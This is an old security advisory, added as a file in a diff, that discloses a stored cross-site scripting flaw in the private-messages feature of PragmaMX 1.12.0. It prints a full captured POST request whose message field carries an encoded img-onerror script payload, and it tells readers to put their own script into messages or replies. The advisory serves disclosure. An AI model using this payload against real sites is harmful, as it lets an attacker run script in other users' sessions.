@@ -1,0 +1,62 @@
+# TITLE ... # Persistent XSS in PragmaMX 1.12.0 for logged in users    #
+# DATE .... # 30.01.2012 .......................................... #
+# AUTOHR .. # http://hauntit.blogspot.com ................ #
+# SOFT LINK # http://www.pragmamx.org ............................. #
+# VERSION . # 1.12.0 .............................................. #
+# TESTED ON # LAMP ................................................ #
+#...................................................................#
+
+# 1. What is this?
+# 2. What is the type of vulnerability?
+# 3. Where is bug :)
+# 4. More...
+
+#............................................#
+# 1. What is this?
+ "pragmaMx - the fast CMS". :)
+You should try it!
+
+# 2. What is the type of vulnerability?
+ This is persistent cross-site scripting for authenticated users.
+
+Vulnerability exists in "Private Messages".
+Here I present You sample HTTP traffic (from BurpProxy).
+
+...cut...
+POST /pragmaMx_1.12.0/html/modules.php?name=Private_Messages HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Ubuntu; X11; Linux i686; rv:9.0.1) Gecko/20100101
+Firefox/9.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-us;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer:
+http://pragmaMx_1.12.0/html/modules.php?name=Private_Messages&op=send
+Cookie: mxA9649D14D6AAF90E4A70576BF4ACC1=6db52d6de453f7a5890b36ebafd99fda;
+tab_ya_edituser=0; PHPSESSID=d7nhrjbs5i2pmjvo6vuj1hg2j1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+name=Private_Messages&op=submit&to_user=adminek&subject=persistent+MSG&image=icon1.gif&message=hi%21%0D%0A%27%3E%3Cimg+src%3Dy+onerror%3Dalert%28%27i+am+watching+you%27%29%3B%3E&msg_id=0&submit=Submit
+...cut...
+
+It depends on what code You will add to $message.
+Persistent XSS code could be added when You decide to reply, too.
+
+So click 'Reply' button, and as a $message parameter add Your XSS-code.
+
+# 3. Where is bug :)
+
+$message parameter in source code. We need (more) validation here. :)
+
+# 4. More...
+
+- http://www.pragmamx.org
+- http://hauntit.blogspot.com
+- http://www.google.com
+- http://portswigger.net
+
+# Best regards
+#
